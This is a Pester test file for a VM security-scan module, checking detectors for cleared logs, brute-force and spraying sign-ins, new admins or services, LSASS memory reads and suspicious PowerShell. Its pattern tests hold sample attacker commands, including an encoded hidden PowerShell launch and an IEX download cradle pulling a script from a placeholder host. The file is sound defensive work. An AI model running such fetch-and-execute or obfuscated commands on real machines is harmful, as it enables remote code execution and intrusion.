# SecurityEvent.Tests.ps1
# The nightly security scan's review of the guest's events (#290, part 3):
# cleared logs, sign-ins, account and service changes, Sysmon, PowerShell
# script blocks and crash dumps. The guest only collects facts; the host
# turns them into findings with the pure functions tested here. Nothing here
# touches a VM.

BeforeAll {
    . (Join-Path -Path $PSScriptRoot -ChildPath 'TestHelpers.ps1')
    Import-LazyVMModule

    $module = 'LazyVM'

    function New-Fact {
        <# The facts the guest script reports for an area, as the host reads them back from JSON. #>
        param([Parameter(Mandatory)][hashtable]$Fact)
        return (ConvertTo-Json -InputObject $Fact -Depth 6 | ConvertFrom-Json -DateKind String)
    }

    function New-SignIn {
        param([int]$Id, [string]$Time, [string]$Account = 'sean', [string]$Source = '10.0.0.9', [int]$Type = 3)
        return @{ Id = $Id; Time = $Time; Account = $Account; Source = $Source; Type = $Type }
    }

    function New-FailedSignIn {
        <# $Count failed sign-ins, a minute apart from $Start, for each of $Account. #>
        param([int]$Count, [datetime]$Start, [string[]]$Account = @('sean'), [string]$Source = '10.0.0.9')
        foreach ($name in $Account) {
            for ($i = 0; $i -lt $Count; $i++) {
                New-SignIn -Id 4625 -Time $Start.AddMinutes($i).ToString('o') -Account $name -Source $Source
            }
        }
    }

    $start = [datetime]::new(2026, 11, 4, 2, 0, 0, [DateTimeKind]::Utc)
}

Describe 'Get-LogClearedFinding' {
    It 'reports a cleared <Log> log as High, with who cleared it and when' -ForEach @(
        @{ Log = 'Security' }
        @{ Log = 'System' }
    ) {
        $fact = New-Fact @{ Events = @(@{ Log = $Log; Time = '2026-11-04T02:10:00.0000000Z'; By = 'intruder' }) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-LogClearedFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'High'
        $findings[0].Id | Should -Be "LogCleared:${Log}:20261104021000"
        $findings[0].WhatWeFound | Should -Match "$Log log"
        $findings[0].WhatWeFound | Should -Match 'intruder'
        $findings[0].Area() | Should -Be 'LogCleared'
    }

    It 'finds nothing when no log was cleared' {
        $fact = New-Fact @{ Events = @() }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-LogClearedFinding -Fact $Fact }).Count | Should -Be 0
    }
}

Describe 'Get-SignInFinding' {
    It 'reports a successful sign-in after five failed ones for the account from the source within five minutes, as High' {
        $events = @(New-FailedSignIn -Count 5 -Start $start) + (New-SignIn -Id 4624 -Time $start.AddMinutes(6).ToString('o'))
        $fact = New-Fact @{ Events = $events }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'High'
        $findings[0].Id | Should -Be 'SignIn:BruteForce:sean:10.0.0.9:20261104020600'
        $findings[0].WhatWeFound | Should -Match 'sean'
        $findings[0].WhatWeFound | Should -Match '10\.0\.0\.9'
        $findings[0].WhatWeFound | Should -Match '5 failed'
    }

    It 'reports nothing for four failures, however the sign-in goes' {
        $events = @(New-FailedSignIn -Count 4 -Start $start) + (New-SignIn -Id 4624 -Time $start.AddMinutes(5).ToString('o'))
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'reports nothing for five failures that are not followed by a success' {
        $fact = New-Fact @{ Events = @(New-FailedSignIn -Count 5 -Start $start) }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'reports nothing when the success comes more than five minutes after the last failure' {
        $events = @(New-FailedSignIn -Count 5 -Start $start) + (New-SignIn -Id 4624 -Time $start.AddMinutes(4 + 6).ToString('o'))
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'does not count failures spread over more than five minutes' {
        $failures = 0..4 | ForEach-Object { New-SignIn -Id 4625 -Time $start.AddMinutes($_ * 3).ToString('o') }
        $events = @($failures) + (New-SignIn -Id 4624 -Time $start.AddMinutes(14).ToString('o'))
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'does not tie failures from one source to a success from another' {
        $events = @(New-FailedSignIn -Count 5 -Start $start) + (New-SignIn -Id 4624 -Time $start.AddMinutes(6).ToString('o') -Source '10.0.0.77')
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'reads the account whatever its case' {
        $events = @(New-FailedSignIn -Count 5 -Start $start -Account 'SEAN') + (New-SignIn -Id 4624 -Time $start.AddMinutes(6).ToString('o') -Account 'Sean')
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 1
    }

    It 'reports one finding for a burst, however many sign-ins follow it' {
        $events = @(New-FailedSignIn -Count 6 -Start $start) + (New-SignIn -Id 4624 -Time $start.AddMinutes(7).ToString('o')) + (New-SignIn -Id 4624 -Time $start.AddMinutes(8).ToString('o') -Type 10)
        $fact = New-Fact @{ Events = $events }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].WhatWeFound | Should -Match '6 failed'
    }

    It 'reports password spraying, several accounts failing from one source and then one of them signing in, as Medium' {
        $events = @(New-FailedSignIn -Count 2 -Start $start -Account @('sean', 'admin', 'guest')) + (New-SignIn -Id 4624 -Time $start.AddMinutes(4).ToString('o') -Account 'admin')
        $fact = New-Fact @{ Events = $events }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'Medium'
        $findings[0].Id | Should -Be 'SignIn:Spraying:admin:10.0.0.9:20261104020400'
        $findings[0].WhatWeFound | Should -Match '3 accounts'
    }

    It 'does not call two accounts spraying' {
        $events = @(New-FailedSignIn -Count 2 -Start $start -Account @('sean', 'admin')) + (New-SignIn -Id 4624 -Time $start.AddMinutes(3).ToString('o') -Account 'admin')
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'does not report a sign-in by an account that did not fail as spraying' {
        $events = @(New-FailedSignIn -Count 2 -Start $start -Account @('sean', 'admin', 'guest')) + (New-SignIn -Id 4624 -Time $start.AddMinutes(4).ToString('o') -Account 'backup')
        $fact = New-Fact @{ Events = $events }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }

    It 'finds nothing without events' {
        $fact = New-Fact @{ Events = @() }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SignInFinding -Fact $Fact }).Count | Should -Be 0
    }
}

Describe 'Get-AccountChangeFinding' {
    It 'reports <What> as <Severity>' -ForEach @(
        @{ What = 'a user created'; Severity = 'Medium'; Event = @{ Id = 4720; Time = '2026-11-04T02:10:00Z'; Name = 'newuser'; By = 'sean' }; Expected = 'AccountChange:UserCreated:newuser:20261104021000' }
        @{ What = 'a user added to Administrators'; Severity = 'High'; Event = @{ Id = 4732; Time = '2026-11-04T02:10:00Z'; Name = 'newuser'; By = 'sean' }; Expected = 'AccountChange:AdminAdded:newuser:20261104021000' }
        @{ What = 'a service installed (7045)'; Severity = 'Medium'; Event = @{ Id = 7045; Time = '2026-11-04T02:10:00Z'; Name = 'EvilSvc'; Path = 'C:\Tools\evil.exe' }; Expected = 'AccountChange:ServiceInstalled:EvilSvc:20261104021000' }
        @{ What = 'a service installed (4697)'; Severity = 'Medium'; Event = @{ Id = 4697; Time = '2026-11-04T02:10:00Z'; Name = 'EvilSvc'; Path = 'C:\Tools\evil.exe' }; Expected = 'AccountChange:ServiceInstalled:EvilSvc:20261104021000' }
    ) {
        $fact = New-Fact @{ Events = @($Event) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-AccountChangeFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be $Severity
        $findings[0].Id | Should -Be $Expected
        $findings[0].Area() | Should -Be 'AccountChange'
    }

    It 'lists the program a service runs in Where' {
        $fact = New-Fact @{ Events = @(@{ Id = 7045; Time = '2026-11-04T02:10:00Z'; Name = 'EvilSvc'; Path = 'C:\Tools\evil.exe' }) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-AccountChangeFinding -Fact $Fact })

        $findings[0].Where | Should -Contain 'C:\Tools\evil.exe'
    }

    It 'leaves out the Sysmon service, which LazyVM installs itself' {
        $fact = New-Fact @{ Events = @(@{ Id = 7045; Time = '2026-11-04T02:10:00Z'; Name = 'Sysmon'; Path = 'C:\Windows\Sysmon.exe' }) }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-AccountChangeFinding -Fact $Fact }).Count | Should -Be 0
    }
}

Describe 'Get-SysmonFinding' {
    It 'reports a program reading the memory of LSASS as High' {
        $fact = New-Fact @{ Events = @(@{ Id = 10; Time = '2026-11-04T02:10:00Z'; Image = 'C:\Users\sean\Downloads\dump.exe'; Target = 'C:\Windows\System32\lsass.exe'; Access = '0x1010' }) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SysmonFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'High'
        $findings[0].Id | Should -Be 'Sysmon:LsassAccess:dump.exe:20261104021000'
        $findings[0].Where | Should -Contain 'C:\Users\sean\Downloads\dump.exe'
    }

    It 'reports a thread started in another process as Medium' {
        $fact = New-Fact @{ Events = @(@{ Id = 8; Time = '2026-11-04T02:10:00Z'; Image = 'C:\Temp\inject.exe'; Target = 'C:\Windows\explorer.exe' }) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SysmonFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'Medium'
        $findings[0].Id | Should -Be 'Sysmon:RemoteThread:inject.exe:explorer.exe:20261104021000'
    }

    It 'reports one Low finding for a program started from Temp or Downloads, however often it ran' {
        $run = @{ Id = 1; Image = 'C:\Users\sean\AppData\Local\Temp\setup.exe' }
        $fact = New-Fact @{ Events = @(($run + @{ Time = '2026-11-04T02:10:00Z' }), ($run + @{ Time = '2026-11-04T03:10:00Z' })) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SysmonFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'Low'
        $findings[0].Id | Should -Be 'Sysmon:StartedFromTemp:C:\Users\sean\AppData\Local\Temp\setup.exe'
        $findings[0].WhatWeFound | Should -Match '2 times'
    }

    It 'finds nothing without events' {
        $fact = New-Fact @{ Events = @() }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-SysmonFinding -Fact $Fact }).Count | Should -Be 0
    }
}

Describe 'Get-PowerShellScriptFinding' {
    It 'reports a script block that matched, as Medium, with why and in which log' {
        $fact = New-Fact @{ Events = @(@{ Log = 'PowerShellCore'; Time = '2026-11-04T02:10:00Z'; BlockId = 'b1a2'; Matched = @(1) }) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-PowerShellScriptFinding -Fact $Fact })

        $findings.Count | Should -Be 1
        $findings[0].Severity | Should -Be 'Medium'
        $findings[0].Id | Should -Be 'PowerShellScript:PowerShellCore:b1a2'
        $findings[0].WhatWeFound | Should -Match 'PowerShell 7'
        $findings[0].WhatWeFound | Should -Match 'decodes'
    }

    It 'says Windows PowerShell for the Windows PowerShell log' {
        $fact = New-Fact @{ Events = @(@{ Log = 'PowerShell'; Time = '2026-11-04T02:10:00Z'; BlockId = 'c3'; Matched = @(0) }) }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-PowerShellScriptFinding -Fact $Fact })

        $findings[0].WhatWeFound | Should -Match 'Windows PowerShell'
    }
}

Describe 'The suspicious PowerShell patterns' {
    It 'matches <Name>' -ForEach @(
        @{ Name = 'an encoded command'; Text = 'powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' }
        @{ Name = 'a decode that is run'; Text = '$b = [Convert]::FromBase64String($x); iex ([Text.Encoding]::UTF8.GetString($b))' }
        @{ Name = 'a download that is run'; Text = 'IEX (New-Object Net.WebClient).DownloadString(''http://example.test/a.ps1'')' }
        @{ Name = 'text built from character codes'; Text = '[char]73+[char]69+[char]88+[char]32' }
    ) {
        $matched = InModuleScope $module -Parameters @{ Text = $Text } {
            param($Text)
            @($script:SuspiciousPowerShell | Where-Object { [regex]::IsMatch($Text, $_.Pattern) }).Count
        }

        $matched | Should -BeGreaterThan 0
    }

    It 'does not match the code LazyVM runs in the guest' {
        # Not this file's own source, which holds the patterns.
        $own = Get-ChildItem -LiteralPath (Join-Path $script:LazyVMModuleDir 'Private') -Filter '*.ps1' -Recurse | Where-Object Name -ne 'SecurityEvent.ps1' | ForEach-Object { Get-Content -LiteralPath $_.FullName -Raw }
        $own += Get-Content -LiteralPath (Join-Path $script:LazyVMModuleDir 'Data\Guest.Helpers.ps1') -Raw

        $matched = InModuleScope $module -Parameters @{ Own = $own } {
            param($Own)
            @($Own | Where-Object { $text = $_; $script:SuspiciousPowerShell | Where-Object { [regex]::IsMatch($text, $_.Pattern) } }).Count
        }

        $matched | Should -Be 0
    }
}

Describe 'Get-CrashDumpFinding' {
    It 'reports one Low finding for each folder with new crash files, with how many' {
        $fact = New-Fact @{ Items = @(
                @{ Folder = 'Minidump'; Name = 'a.dmp'; Time = '2026-11-04T01:00:00Z'; Size = 100 }
                @{ Folder = 'Minidump'; Name = 'b.dmp'; Time = '2026-11-04T02:00:00Z'; Size = 100 }
                @{ Folder = 'WER'; Name = 'Report.wer'; Time = '2026-11-04T02:30:00Z'; Size = 10 }
            )
        }

        $findings = @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-CrashDumpFinding -Fact $Fact })

        $findings.Count | Should -Be 2
        @($findings | Where-Object Severity -ne 'Low').Count | Should -Be 0
        ($findings | Where-Object Id -eq 'CrashDump:Minidump:20261104020000').WhatWeFound | Should -Match '2 files'
        @($findings | Where-Object Id -eq 'CrashDump:WER:20261104023000').Count | Should -Be 1
    }

    It 'finds nothing without crash files' {
        $fact = New-Fact @{ Items = @() }

        @(InModuleScope $module -Parameters @{ Fact = $fact } { param($Fact) Get-CrashDumpFinding -Fact $Fact }).Count | Should -Be 0
    }
}

Describe 'The areas of the event review' {
    It 'are checked by the scan, after the settings checks' {
        $keys = InModuleScope $module { @($script:SecurityCheck.Keys) }

        $keys[-6..-1] | Should -Be @('LogCleared', 'SignIn', 'AccountChange', 'Sysmon', 'PowerShellScript', 'CrashDump')
    }
}
